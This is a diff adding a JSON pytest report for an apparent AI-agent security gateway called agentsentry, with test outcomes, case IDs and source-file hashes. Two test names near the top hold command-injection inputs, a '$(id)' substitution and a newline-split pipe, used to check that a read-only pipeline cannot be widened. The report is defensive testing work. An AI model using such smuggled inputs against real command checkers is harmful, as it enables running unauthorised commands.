+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_read_pipeline_cannot_expand_coverage[cat $(id) | head -n 1]",
+      "outcome": "passed",
+      "duration_seconds": 0.006037523038685322,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_read_pipeline_cannot_expand_coverage[cat README.md\\n| head -n 1]",
+      "outcome": "passed",
+      "duration_seconds": 0.0058631738647818565,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_snapshot.py::test_backup_restore_preserves_audit_invalidates_approval",
+      "outcome": "passed",
+      "duration_seconds": 0.14881385024636984,
+      "cases": [
+        "TC-41",
+        "TC-29"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_explicit_write_verbs[Create an event]",
+      "outcome": "passed",
+      "duration_seconds": 0.0005121286958456039,
+      "cases": [
+        "TC-06"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_explicit_write_verbs[Add a participant]",
+      "outcome": "passed",
+      "duration_seconds": 0.0004695151001214981,
+      "cases": [
+        "TC-06"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_explicit_write_verbs[Reserve a room]",
+      "outcome": "passed",
+      "duration_seconds": 0.00044790375977754593,
+      "cases": [
+        "TC-06"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_explicit_write_verbs[Delete a file]",
+      "outcome": "passed",
+      "duration_seconds": 0.0004362398758530617,
+      "cases": [
+        "TC-06"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_explicit_write_verbs[Append a note]",
+      "outcome": "passed",
+      "duration_seconds": 0.0005251234397292137,
+      "cases": [
+        "TC-06"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_explicit_write_verbs[Invite a user]",
+      "outcome": "passed",
+      "duration_seconds": 0.0004252418875694275,
+      "cases": [
+        "TC-06"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_word_boundaries_and_negative_language",
+      "outcome": "passed",
+      "duration_seconds": 0.0004936140030622482,
+      "cases": [
+        "TC-06"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_mentioning_an_action_is_not_authorization[Explain how to delete a file]",
+      "outcome": "passed",
+      "duration_seconds": 0.00035461876541376114,
+      "cases": [
+        "TC-06"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_mentioning_an_action_is_not_authorization[Read the book]",
+      "outcome": "passed",
+      "duration_seconds": 0.0003270180895924568,
+      "cases": [
+        "TC-06"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_mentioning_an_action_is_not_authorization[Check the reservation]",
+      "outcome": "passed",
+      "duration_seconds": 0.00033226050436496735,
+      "cases": [
+        "TC-06"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_mentioning_an_action_is_not_authorization[Explain 'send the report to Alice']",
+      "outcome": "passed",
+      "duration_seconds": 0.00035167671740055084,
+      "cases": [
+        "TC-06"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_mentioning_an_action_is_not_authorization[Describe the command create_file]",
+      "outcome": "passed",
+      "duration_seconds": 0.00033871177583932877,
+      "cases": [
+        "TC-06"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_exact_user_destination_keeps_untrusted_status_and_hard_deny",
+      "outcome": "passed",
+      "duration_seconds": 0.003557676449418068,
+      "cases": [
+        "TC-10"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_untrusted_context_cannot_grant_a_destination",
+      "outcome": "passed",
+      "duration_seconds": 0.007150568999350071,
+      "cases": [
+        "TC-08"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_ambiguous_or_forbidden_recipient_never_implicitly_authorized[Send it to Alice and Bob]",
+      "outcome": "passed",
+      "duration_seconds": 0.0004172511398792267,
+      "cases": [
+        "TC-06"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_ambiguous_or_forbidden_recipient_never_implicitly_authorized[Send it to her]",
+      "outcome": "passed",
+      "duration_seconds": 0.0003535440191626549,
+      "cases": [
+        "TC-06"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_ambiguous_or_forbidden_recipient_never_implicitly_authorized[Send it to the address in the file]",
+      "outcome": "passed",
+      "duration_seconds": 0.0003589475527405739,
+      "cases": [
+        "TC-06"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_ambiguous_or_forbidden_recipient_never_implicitly_authorized[Do not send to Alice]",
+      "outcome": "passed",
+      "duration_seconds": 0.0003271857276558876,
+      "cases": [
+        "TC-06"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_ambiguous_or_forbidden_recipient_never_implicitly_authorized[Send it to Alice; offline]",
+      "outcome": "passed",
+      "duration_seconds": 0.0004091775044798851,
+      "cases": [
+        "TC-06"
+      ]
+    },
+    {
+      "test": "tests/test_task_destinations.py::test_same_origin_redirect_requires_new_guarded_action",
+      "outcome": "passed",
+      "duration_seconds": 0.001416318118572235,
+      "cases": [
+        "TC-10"
+      ]
+    }
+  ],
+  "completed_at": "2026-09-12T10:05:11.738538+00:00",
+  "python": "3.12.3",
+  "platform": "Linux-5.15.0-119-generic-x86_64-with-glibc2.35",
+  "source_files": {
+    "src/agentsentry/__init__.py": "79f5cc2de9ea3cd38e96447556c5ffae91d8ec303cc4de4cde8debbd189a8389",
+    "src/agentsentry/adapters/__init__.py": "b6e8dcdc09772cddd2bb5d802a0a387eb0d106ae6db6ed9d02931fed7bb2edb7",
+    "src/agentsentry/adapters/filesystem.py": "a511c58685888638f4411e4ff4d2f4c8b665db2041d696e95efb3c2aa6fffadc",
+    "src/agentsentry/adapters/mcp_client.py": "96bc6946241856bc5397c8f5fe95b22dc3359291579f9efbb051fef554bcdee3",
+    "src/agentsentry/adapters/network.py": "1b9b2585c14aa9966e1da844f4eb196c4238e32394541b88bb473d13e6d34308",
+    "src/agentsentry/adapters/registry.py": "c7100afa83733b324b02184761d3af67d994f563d366605b5a1c4fd09abb5405",
+    "src/agentsentry/adapters/sandbox.py": "ccb17d44b0cda9eb248c67b78517915c809fb759aa8ce9eac1380ce9a6987d49",
+    "src/agentsentry/adapters/sandbox_worker.py": "9ea7ed8cddf3f077eb8638df839fdf2af5d8691c92744692bafea4a5f121daea",
+    "src/agentsentry/api/__init__.py": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
+    "src/agentsentry/api/app.py": "9f9db245430d4d7c562c97967ef119e2229cfbfba61a3b28529348a76876e39e",
+    "src/agentsentry/cli.py": "022341edac697e4b444a80c1f4a4af603e6b70eb9e94c6de5aa3cbfebb2402a2",
+    "src/agentsentry/config.py": "30936a5f905b0779c6a9b2e5b7d82eecb3967ca28584f5a6d9a1246dda25a161",
+    "src/agentsentry/context/__init__.py": "403cc454fa75fe7937d3bb1664b750f09c7f68efd99778a858aecb3de419c365",
+    "src/agentsentry/context/scanner.py": "741b11ed9e19db202b04ae2b13264432372d9df68e5c609f5358dbf1ccff87e5",
+    "src/agentsentry/demo.py": "4de31e807b2f93cebc2bea14c03ce909c68da6abb5ce9106c580997127c2c1f4",
+    "src/agentsentry/evaluation.py": "e712020379b782ba87beb456492dd5a7ef4477b08a4067db7fac6f3fbeb4b9fc",
+    "src/agentsentry/gateway/__init__.py": "1c3d16ef06e300d11b2e72ea2a8274ba02d45aa8659c1c7a1de9e4066e762271",
+    "src/agentsentry/gateway/mcp_server.py": "a3cedd8b7aa2a8c8094e9cf34ea509f9fdb46fb8e2e883f13b66c7d44985a58e",
+    "src/agentsentry/gateway/native_hooks.py": "b6f92308bb848ad158dd9b0085410d30f1eb7ca204c92a2bf24f1d31f0578993",
+    "src/agentsentry/gateway/runtime.py": "5e22ac5ec782880bcc9145c66b19dbe00ea96f5be801372a64f0c999b2ded1f8",
+    "src/agentsentry/intent/__init__.py": "0c86f21107929e4106a3b6021a9f94b1c2bc4caa8111be0792547fabd2341911",
+    "src/agentsentry/intent/contracts.py": "3b0a5e623c5b4bd6d70d8cab2b36a21d3cd90ccc7dd6f94723c6c6e8047538cd",
+    "src/agentsentry/policy/__init__.py": "5c784be0354e02f4a797c514b59abbab19ab30ea3728f17515cf89cd62686657",
+    "src/agentsentry/policy/dsl.py": "878e8dfc94c611419bf36c12d897cbe8a56d00418b64007ef0937b1fd1f471bc",
+    "src/agentsentry/policy/engine.py": "2c85edce55e62514833e50e94a0f7862e329b76203235a2dc863c85e511dddd4",
+    "src/agentsentry/schemas/__init__.py": "c7a5746ac4519ef52c85b62f9346a0537f39db8604ee732237f08cd2055bc8f1",
+    "src/agentsentry/schemas/models.py": "4c8ec2e2fb7e41f462e1083223758c3b6833311219c24b9e3ba8bcc973714a57",
+    "src/agentsentry/trace/__init__.py": "995831b7a03eded1df23b87dbc7516ea050e2651fa7b2ada26c33b296ace0d67",
+    "src/agentsentry/trace/logging.py": "e12031dfa9399a06485e21df4d6ec6a8284bb285844e330d09fd7b684d550c99",
+    "src/agentsentry/trace/store.py": "2feb670734980d1ac8ca0e62c772c654f348735a196eadf3c43ff08672f0734f",
+    "policies/default.aspolicy": "122869e0d6eca6a660f32861386d8a96bae4e46329215fd8d3d695aa6572d5d7",
+    "tests/conftest.py": "d1ae4f2a1e13a59d180486e94c1e891b8aaf57df973e35c50a6fc2ac468aa662",
+    "tests/mcp_fixture_server.py": "25f12cdf2c1828287f9291cbd09d3c84fb2c8c47f12a12e68d67c0401abb82a2",
+    "tests/test_api_sandbox.py": "a7c0399e5b11e827379855c21e5742196b9547a419bd251ceab5fc3364188264",
+    "tests/test_benchmark_acceptance.py": "6809b27d3eabbe519026cec7d45e5e5cc36d6ea538a44854186d7ffad96d5d12",
+    "tests/test_benchmark_protocol.py": "7187d2749a56fffa5664b39b845b30da72f720055e7037899368cd4a083d00e0",
+    "tests/test_components.py": "08eb7cec9a8289694865dbd795b977506103aa327c9b354fc71b31ea8f751d51",
+    "tests/test_evaluation.py": "9b15695041e3349071935880bfa6b4416f481b21511d1aea57b1b9629ea7560d",
+    "tests/test_gateway.py": "1c54d0a53631d9698f87f3f77fc5d0d64ca65eb3e605fc77ececbbd05ef8c7a6",
+    "tests/test_mcp.py": "ed4459b72f4d9d23c5d3790697591ac61a98e25bfc6a3bd4ce4e39ed4ebe1797",
+    "tests/test_native_hooks.py": "f977e2ed85296f9156084b2e3679b109cfb6169ac8392ff8c6f7ed5357eaca61",
+    "tests/test_snapshot.py": "100be3d5c33bf2ee55ae2b8a22dcb342e7d24df438ed568dd0171a8bf920336d",
+    "tests/test_task_destinations.py": "e7961995cdf8cad636ec436df598d3a4b7096ac3e8a1469bb5b14a2a62de035b",
+    "dashboard/src/main.tsx": "ec86b91c802c61eabab3677096f6e2d820e2ba735e38a1dc2c65316a08edb087",
+    "dashboard/src/style.css": "efbccaabe84f7d08ae6c2b52dcf35be051653628616a525bd509d96cdecf75b8"
+  }
+}
